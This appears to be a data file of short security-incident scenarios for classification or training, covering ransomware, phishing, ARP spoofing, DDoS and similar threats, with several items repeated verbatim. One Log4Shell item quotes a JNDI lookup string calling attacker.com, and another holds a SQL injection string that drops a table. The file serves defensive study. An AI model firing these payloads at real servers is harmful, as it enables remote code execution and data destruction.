threat_description: Antivirus detects outbound traffic to 185.220.101.x at irregular intervals. System processes silently spawning cmd.exe and powershell.exe with encoded payloads.

A system administrator notices that a contractor account is accessing the HR payroll database at 11 PM on a Sunday. The account has no legitimate reason to access payroll. Exfiltration of 4,200 employee salary records is suspected.

A hospital network logs show a device sending ARP replies claiming to be the default gateway. All traffic from workstations on VLAN 10 is being routed through an unknown MAC address before reaching the internet.

A web server running Apache Log4j 2.14.1 receives a GET request with the header: X-Api-Version: ${jndi:ldap://attacker.com/exploit}. The server makes an outbound LDAP connection to the attacker's server seconds later.

Multiple employees report receiving SMS messages claiming to be from IT support, asking them to click a link and enter their VPN credentials to avoid account suspension. The link leads to a convincing fake corporate portal.

Security tools detect PowerShell executing encoded commands that download a payload from a remote server, establish persistence via registry run keys, disable Windows Defender, and begin scanning internal network ports.
Login form receives payload: admin' OR '1'='1'; DROP TABLE users; --
Server receives 847 requests/sec from 1200 different IPs across multiple countries. Legitimate user traffic is being blocked entirely.
All files on the network share are encrypted and renamed with .locked extension. A ransom note demands $500,000 in Bitcoin within 72 hours or keys will be destroyed.

A hospital network logs show a device sending ARP replies claiming to be the default gateway. All traffic from workstations on VLAN 10 is being routed through an unknown MAC address before reaching the internet.

A web server running Apache Log4j 2.14.1 receives a GET request with the header: X-Api-Version: ${jndi:ldap://attacker.com/exploit}. The server makes an outbound LDAP connection to the attacker's server seconds later.

Multiple employees report receiving SMS messages claiming to be from IT support, asking them to click a link and enter their VPN credentials to avoid account suspension. The link leads to a convincing fake corporate portal.
